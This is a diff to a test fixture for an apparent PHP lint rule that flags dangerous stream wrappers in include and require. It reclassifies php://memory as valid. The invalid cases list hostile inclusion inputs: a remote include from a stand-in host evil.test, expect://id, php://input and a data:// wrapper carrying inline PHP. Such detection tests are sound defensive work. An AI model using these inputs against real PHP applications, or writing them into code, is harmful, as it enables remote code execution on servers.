@@ -1,5 +1,8 @@
 id: php-include-stream-wrapper
 valid:
+# php://memory and php://temp start empty on every open: nothing to execute.
+- <?php include "php://memory";
+- <?php include("php://temp");
 - <?php include "/var/www/app/bootstrap.php";
 - <?php require_once "lib/helpers.php";
 - <?php include __DIR__ . "/lib.php";
@@ -30,6 +33,5 @@ invalid:
 - <?php include "https://evil.test/x.php";
 - <?php include "expect://id";
 - <?php INCLUDE "PHP://INPUT";
-- <?php include "php://memory";
 - <?php require_once 'php://input';
 - <?php include 'data://text/plain,<?php phpinfo();';
